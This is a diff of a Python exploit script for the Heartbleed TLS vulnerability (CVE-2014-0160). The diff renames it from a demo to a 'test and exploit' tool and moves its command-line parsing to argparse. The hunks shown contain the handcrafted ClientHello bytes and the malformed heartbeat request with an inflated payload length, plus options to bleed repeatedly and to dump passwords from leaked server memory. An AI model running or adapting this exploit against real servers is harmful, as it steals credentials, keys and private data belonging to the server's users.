@@ -1,16 +1,16 @@
 #!/bin/python3
 #
-# Demo of heartbleed(CVE-2014-0160)
+# Test and exploit TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)
 #
-# @Author Huang Yuzhong (hyzgog@gmail.com)
-# @Reference Jared Stafford (jspenguin@jspenguin.org)
-#
+# Author: Huang Yuzhong (hyzgog@gmail.com)
+# Refer:  Jared Stafford (jspenguin@jspenguin.org)
+# Refer:  Travis Lee
 
 import asyncio
 import binascii
 import struct
 import logging
-from optparse import OptionParser
+import argparse
 
 # tls_versions = {'TLSv1.0': '0x01', 'TLSv1.1': '0x02', 'TLSv1.2': '0x03'}
 
@@ -21,12 +21,12 @@ def build_client_client_hello(tls_ver = 0x01):
 	return [
 # TLS header ( 5 bytes)
 0x16,               # Content type (0x16 for handshake)
-0x03, tls_ver,         # TLS Version
+0x03, tls_ver,      # TLS Version
 0x00, 0xdc,         # Length
 # Handshake header
 0x01,               # Type (0x01 for ClientHello)
 0x00, 0x00, 0xd8,   # Length
-0x03, tls_ver,         # TLS Version
+0x03, tls_ver,      # TLS Version
 # Random (32 byte)
 0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b,
 0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97,
@@ -69,12 +69,12 @@ def build_client_client_hello(tls_ver = 0x01):
 
 def build_heartbeat(tls_ver = 0x01):
 	return [
-0x18,       # Content Type (Heartbeat)
+0x18,       	# Content Type (Heartbeat)
 0x03, tls_ver,  # TLS version
-0x00, 0x03,  # Length
+0x00, 0x03,		# Length
 # Payload
-0x01,       # Type (Request)
-0x40, 0x00  # Payload length
+0x01,			# Type (Request)
+0x40, 0x00		# Payload length
 	] 
 
 client_hello = hex2bin(build_client_client_hello())
@@ -183,15 +183,16 @@ def bleed(concurrency, forever):
 		asyncio.async(bleed(concurrency, forever))
 
 if __name__ == '__main__':
-	optionParser = OptionParser(usage='%prog server [option]', description='Demo of heartbleed(CVE-2014-0160)')
-	optionParser.add_option('-p', '--port', type='int', default=443, help='TCP port to test')
-	optionParser.add_option('-o', '--output', type='string', default='text', help='Output format [password, text, hex]')
-	optionParser.add_option('-c', '--concurrency', type='int', default=1, help='Concurrency')
-	optionParser.add_option('-f', '--forever', action='store_true', default=False, help='Forever')
+	parser = argparse.ArgumentParser(description='Test and exploit TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)')
+	parser.add_argument('host', help='Host to test')
+	parser.add_argument('-p', '--port', type=int, default=443, help='TCP port to test (default: 443)')
+	parser.add_argument('-o', '--output', default='text', help='Output [password, text, hex] (default: text)')
+	parser.add_argument('-c', '--concurrency', type=int, default=1, help='Concurrency')
+	parser.add_argument('-f', '--forever', action='store_true', default=False, help='Forever')
 
-	option, arg = optionParser.parse_args()
-	if len(arg) < 1:
-		optionParser.print_help()
+	option = parser.parse_args()
+	if option.host is None:
+		parser.print_help()
 	else:
 		if option.output == 'password':
 			dump = passdump
